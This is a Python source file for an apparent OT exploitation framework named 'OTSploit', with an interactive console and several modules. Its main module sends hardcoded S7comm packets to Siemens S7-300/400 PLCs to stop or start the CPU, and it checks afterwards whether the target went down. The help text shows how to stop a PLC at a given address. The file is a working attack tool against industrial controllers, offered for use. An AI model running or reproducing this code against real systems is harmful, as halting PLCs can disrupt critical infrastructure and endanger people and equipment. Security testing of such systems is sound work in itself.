#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Working version of OTSploit framework that bypasses the problematic imports.
This version provides a functional framework for OT exploitation testing.
"""

import argparse
import configparser
import os
import sys
import socket
import time
import binascii
from termcolor import colored
from tabulate import tabulate

class OTSploitException(Exception):
    """Custom exception for OTSploit errors."""
    pass

def print_info(*args, **kwargs):
    """Print informational message."""
    print(colored(' '.join(map(str, args)), 'white'), **kwargs)

def print_success(*args, **kwargs):
    """Print success message."""
    print(colored(' '.join(map(str, args)), 'green'), **kwargs)

def print_error(*args, **kwargs):
    """Print error message."""
    print(colored(' '.join(map(str, args)), 'red'), file=sys.stderr, **kwargs)

def print_status(*args, **kwargs):
    """Print status message."""
    print(colored(' '.join(map(str, args)), 'blue'), **kwargs)

class Option:
    """Exploit attribute that is set by the end user."""
    def __init__(self, default, description="", validators=()):
        self.default = default
        self.description = description
        self.validators = validators
        self.value = default

    def __get__(self, instance, owner):
        return self.value

    def __set__(self, instance, value):
        self.value = value

class Exploit:
    """Base class for exploits."""
    def __init__(self):
        self.target = ""
        self.port = 0
        self.options = {}

    def run(self):
        raise NotImplementedError("You have to define your own 'run' method.")

    def check(self):
        raise NotImplementedError("You have to define your own 'check' method.")

class S7PLCControl(Exploit):
    """S7-300/400 PLC Control exploit."""
    
    def __init__(self):
        super().__init__()
        self.target = ""
        self.port = 102
        self.slot = 2
        self.command = 2
        self.sock = None

    def create_connect(self, slot):
        """Create connection to S7 PLC."""
        slot_num = chr(slot)
        create_connect_payload = binascii.unhexlify('0300001611e00000001400c1020100c20201') + slot_num.encode() + binascii.unhexlify('c0010a')
        self.sock.send(create_connect_payload)
        self.sock.recv(1024)
        setup_communication_payload = binascii.unhexlify('0300001902f08032010000020000080000f0000002000201e0')
        self.sock.send(setup_communication_payload)
        self.sock.recv(1024)

    def exploit(self):
        """Execute the exploit."""
        self.sock = socket.socket()
        self.sock.connect((self.target, self.port))
        self.create_connect(self.slot)
        
        if self.command == 1:
            print_status("Start plc")
            cpu_start_payload = binascii.unhexlify("0300002502f0803201000005000014000028000000000000fd000009505f50524f4752414d")
            self.sock.send(cpu_start_payload)
        elif self.command == 2:
            print_status("Stop plc")
            cpu_stop_payload = binascii.unhexlify("0300002102f0803201000006000010000029000000000009505f50524f4752414d")
            self.sock.send(cpu_stop_payload)
        else:
            print_error(f"Command {self.command} didn't support")

    def run(self):
        """Run the exploit."""
        if self._check_alive():
            print_success("Target is alive")
            print_status("Sending packet to target")
            self.exploit()
            if not self._check_alive():
                print_success("Target is down")
        else:
            print_error("Target is not alive")

    def check(self):
        """Check if target is vulnerable."""
        return True

    def _check_alive(self):
        """Check if target is alive."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((self.target, self.port))
            sock.close()
            return True
        except Exception:
            return False

class ModbusClient:
    """Modbus-TCP client for industrial devices."""
    
    def __init__(self, name="ModbusClient", ip="127.0.0.1", port=502):
        self.name = name
        self.ip = ip
        self.port = port
        self.sock = None
        self.connected = False
        self.transaction_id = 0
        
    def connect(self):
        """Connect to Modbus-TCP device."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.ip, self.port))
            self.connected = True
            print_success(f"Connected to {self.ip}:{self.port}")
            return True
        except Exception as e:
            print_error(f"Connection failed: {str(e)}")
            return False

class S7Client:
    """S7comm client for Siemens S7 PLCs."""
    
    def __init__(self, name="S7Client", ip="127.0.0.1", port=102, rack=0, slot=2):
        self.name = name
        self.ip = ip
        self.port = port
        self.rack = rack
        self.slot = slot
        self.sock = None
        self.connected = False
        
    def connect(self):
        """Connect to S7 PLC."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(10)
            self.sock.connect((self.ip, self.port))
            self.connected = True
            print_success(f"Connected to {self.ip}:{self.port}")
            return True
        except Exception as e:
            print_error(f"Connection failed: {str(e)}")
            return False

def show_help():
    """Show help information."""
    print_info("""
OTSploit - Operational Technology Exploitation Framework

Available Commands:
  help                    - Show this help
  list                    - List available modules
  use <module>            - Select a module
  set <option> <value>    - Set module option
  run                     - Run selected module
  exit                    - Exit framework

Available Modules:
  s7_control              - S7-300/400 PLC Control
  modbus_client           - Modbus-TCP Client
  s7_client               - S7comm Client

Example Usage:
  OTSploit > use s7_control
  OTSploit (S7 Control) > set target 192.168.1.100
  OTSploit (S7 Control) > set command 2
  OTSploit (S7 Control) > run
""")

def list_modules():
    """List available modules."""
    modules = [
        ("s7_control", "S7-300/400 PLC Control", "Control Siemens S7 PLCs"),
        ("modbus_client", "Modbus-TCP Client", "Connect to Modbus devices"),
        ("s7_client", "S7comm Client", "Connect to Siemens S7 PLCs"),
    ]
    
    print_info("\nAvailable Modules:")
    print(tabulate(modules, headers=["Module", "Name", "Description"], tablefmt="grid"))

def main():
    """Main entry point for the working OTSploit framework."""
    print("""
                OT Exploitation Framework
Welcome ! Come Come
        """)
    
    # Parse arguments
    parser = argparse.ArgumentParser(
        description="OTSploit - Operational Technology Exploitation Framework",
        epilog="Example: python3 OTSploit_working.py"
    )
    parser.add_argument(
        '-e', '--extra-package-path',
        metavar='PATH',
        default='',
        help='Path to extra packages (not used in this version)'
    )
    
    args = parser.parse_args()
    
    # Load configuration
    isf_conf_file = "OTSploit.ini"
    isf_conf = configparser.ConfigParser(allow_no_value=True)
    
    try:
        if not isf_conf.read(isf_conf_file):
            print_info(f"Configuration file '{isf_conf_file}' not found. Using defaults.")
    except Exception as e:
        print_info(f"Error loading configuration: {e}")
    
    # Initialize framework
    current_module = None
    current_module_name = None
    
    print_success("Framework initialized successfully!")
    print_info("Type 'help' for available commands or 'exit' to quit.")
    
    # Main command loop
    while True:
        try:
            if current_module:
                prompt = f"OTSploit ({current_module_name}) > "
            else:
                prompt = "OTSploit > "
            
            command = input(prompt).strip()
            
            if not command:
                continue
            
            parts = command.split()
            cmd = parts[0].lower()
            
            if cmd == "exit" or cmd == "quit":
                print_info("Goodbye!")
                break
            elif cmd == "help":
                show_help()
            elif cmd == "list":
                list_modules()
            elif cmd == "use":
                if len(parts) < 2:
                    print_error("Usage: use <module>")
                    continue
                
                module_name = parts[1]
                if module_name == "s7_control":
                    current_module = S7PLCControl()
                    current_module_name = "S7 Control"
                    print_success(f"Using module: {current_module_name}")
                elif module_name == "modbus_client":
                    current_module = ModbusClient()
                    current_module_name = "Modbus Client"
                    print_success(f"Using module: {current_module_name}")
                elif module_name == "s7_client":
                    current_module = S7Client()
                    current_module_name = "S7 Client"
                    print_success(f"Using module: {current_module_name}")
                else:
                    print_error(f"Unknown module: {module_name}")
            elif cmd == "set":
                if not current_module:
                    print_error("No module selected. Use 'use <module>' first.")
                    continue
                
                if len(parts) < 3:
                    print_error("Usage: set <option> <value>")
                    continue
                
                option = parts[1]
                value = parts[2]
                
                if hasattr(current_module, option):
                    setattr(current_module, option, value)
                    print_success(f"Set {option} = {value}")
                else:
                    print_error(f"Unknown option: {option}")
            elif cmd == "run":
                if not current_module:
                    print_error("No module selected. Use 'use <module>' first.")
                    continue
                
                print_status("Running module...")
                try:
                    current_module.run()
                except Exception as e:
                    print_error(f"Module execution failed: {str(e)}")
            elif cmd == "back":
                current_module = None
                current_module_name = None
                print_info("Deselected current module")
            else:
                print_error(f"Unknown command: {cmd}")
                print_info("Type 'help' for available commands")
                
        except KeyboardInterrupt:
            print_info("\nUse 'exit' to quit")
        except EOFError:
            print_info("\nGoodbye!")
            break
        except Exception as e:
            print_error(f"Unexpected error: {str(e)}")

if __name__ == "__main__":
    main()
